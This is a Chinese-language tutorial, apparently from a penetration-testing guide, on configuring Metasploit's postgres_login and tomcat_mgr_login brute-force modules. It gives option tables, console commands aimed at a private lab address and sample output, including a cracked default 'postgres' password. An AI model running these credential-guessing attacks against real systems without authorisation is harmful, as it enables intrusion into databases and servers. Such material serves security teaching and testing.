### PostgreSQL 登录模块配置选项

以下信息展示了 `postgres_login` 模块中可配置的选项。根据具体的攻击需求，用户可以选择相应的选项进行配置。

| 选项名 | 当前设置 | 是否必填 | 描述 |
| --- | --- | --- | --- |
| SPEED | - | 是 | 暴力破解的速度，范围从0到5 |
| DATABASE | template1 | 否 | 用于认证的数据库 |
| DB_ALL_CREDS | false | 否 | 尝试当前数据库中的每一对用户名和密码 |
| DB_ALL_PASS | false | 否 | 将当前数据库中的所有密码添加到列表中 |
| DB_ALL_USERS | false | 否 | 将当前数据库中的所有用户添加到列表中 |
| PASSWORD | - | 否 | 用于认证的具体密码 |
| PASS_FILE | /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt | 否 | 包含密码的文件，每行一个密码 |
| RETURN_ROWSET | true | 否 | 设置为true以查看查询结果集 |
| RHOSTS | - | 是 | 目标地址范围或CIDR标识符 |
| RPORT | 5432 | 是 | 目标端口 |
| STOP_ON_SUCCESS | false | 是 | 当某个凭证对目标主机有效时停止猜测 |
| THREADS | 1 | 是 | 并发线程数 |
| USERNAME | postgres | 否 | 用于认证的具体用户名 |
| USERPASS_FILE | /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt | 否 | 包含用户名和密码的文件，每行一对（空格分隔） |
| USER_AS_PASS | true | 否 | 将用户名作为密码尝试所有用户 |
| USER_FILE | /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt | 否 | 包含用户名的文件，每行一个用户名 |
| VERBOSE | true | 是 | 是否打印所有尝试的输出 |

#### 配置步骤示例

1. **设置目标系统**：
   ```sh
   msf auxiliary(postgres_login) > set RHOSTS 192.168.41.142
   RHOST => 192.168.41.142
   ```

2. **指定用户名文件**：
   ```sh
   msf auxiliary(postgres_login) > set user_file /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
   user_file => /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
   ```

3. **指定密码文件**：
   ```sh
   msf auxiliary(postgres_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
   pass_file => /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
   ```

4. **运行渗透攻击**：
   ```sh
   msf auxiliary(postgres_login) > exploit
   ```

### 输出示例

```sh
[*] 192.168.41.142:5432 Postgres - [01/21] - Trying username: 'postgres' with password: '' on database 'template1'
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'postgres': ''
[-] 192.168.41.142:5432 Postgres - [01/21] - Username/Password failed
...
[+] 192.168.41.142:5432 Postgres - Success: 'postgres':'postgres' (Database 'template1' succeeded.)
[*] 192.168.41.142:5432 Postgres - Disconnected
```

### Tomcat 管理登录模块配置选项

以下信息展示了 `tomcat_mgr_login` 模块中有效的选项。用户可以选择相应的选项进行配置。

| 选项名 | 当前设置 | 是否必填 | 描述 |
| --- | --- | --- | --- |
| BLANK_PASSWORDS | true | 否 | 尝试所有用户的空白密码 |
| BRUTEFORCE_SPEED | 5 | 是 | 暴力破解的速度，范围从0到5 |
| DB_ALL_CREDS | false | 否 | 尝试当前数据库中的每一对用户名和密码 |
| DB_ALL_PASS | false | 否 | 将当前数据库中的所有密码添加到列表中 |
| DB_ALL_USERS | false | 否 | 将当前数据库中的所有用户添加到列表中 |
| PASSWORD | - | 否 | 用于认证的具体密码 |
| PASS_FILE | /opt/metasploit/apps/pro/msf3/data/wordlists/tomcat_mgr_default_pass.txt | 否 | 包含密码的文件，每行一个密码 |
| PROXIES | - | 否 | 使用代理链 |
| RHOSTS | - | 是 | 目标地址范围或CIDR标识符 |
| RPORT | 8080 | 是 | 目标端口 |
| STOP_ON_SUCCESS | false | 是 | 当某个凭证对目标主机有效时停止猜测 |
| THREADS | 1 | 是 | 并发线程数 |
| URI | /manager/html | 是 | 管理员登录URI，默认为/manager/html |
| USERNAME | - | 否 | 用于认证的具体用户名 |
| USERPASS_FILE | /opt/metasploit/apps/pro/msf3/data/wordlists/tomcat_mgr_default_userpass.txt | 否 | 包含用户名和密码的文件，每行一对（空格分隔） |
| USER_AS_PASS | true | 否 | 将用户名作为密码尝试所有用户 |
| USER_FILE | /opt/metasploit/apps/pro/msf3/data/wordlists/tomcat_mgr_default_users.txt | 否 | 包含用户名的文件，每行一个用户名 |
| VERBOSE | true | 是 | 是否打印所有尝试的输出 |
| VHOST | - | 否 | HTTP服务器虚拟主机 |

#### 配置步骤示例

1. **使用Tomcat管理登录模块**：
   ```sh
   msf auxiliary(postgres_login) > use auxiliary/scanner/http/tomcat_mgr_login
   ```

2. **查看有效选项**：
   ```sh
   msf auxiliary(tomcat_mgr_login) > show options
   ```

3. **设置密码文件**：
   ```sh
   msf auxiliary(tomcat_mgr_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
   PASS_FILE => /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
   ```

4. **设置用户名文件**：
   ```sh
   msf auxiliary(tomcat_mgr_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
   USER_FILE => /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
   ```

5. **设置目标系统**：
   ```sh
   msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.41.142
   RHOSTS => 192.168.41.142
   ```

6. **设置目标端口**：
   ```sh
   msf auxiliary(tomcat_mgr_login) > set RPORT 8180
   RPORT => 8180
   ```

7. **运行渗透攻击**：
   ```sh
   msf auxiliary(tomcat_mgr_login) > exploit
   ```

### 输出示例

```sh
[*] 192.168.41.142:8180 TOMCAT_MGR - [01/63] - Trying username: '' with password: ''
[-] 192.168.41.142:8180 TOMCAT_MGR - [01/63] - /manager/html [Apache-Coyote/1.1] (Tomcat Application Manager) failed to login as ''
...
[+] 192.168.41.142:8180 TOMCAT_MGR - [15/63] - /manager/html [Apache-Coyote/1.1] (Tomcat Application Manager) failed to login as 'role1'
```

以上是关于如何配置和使用 `postgres_login` 和 `tomcat_mgr_login` 模块的详细说明。希望这些信息能帮助你更好地理解和执行相关操作。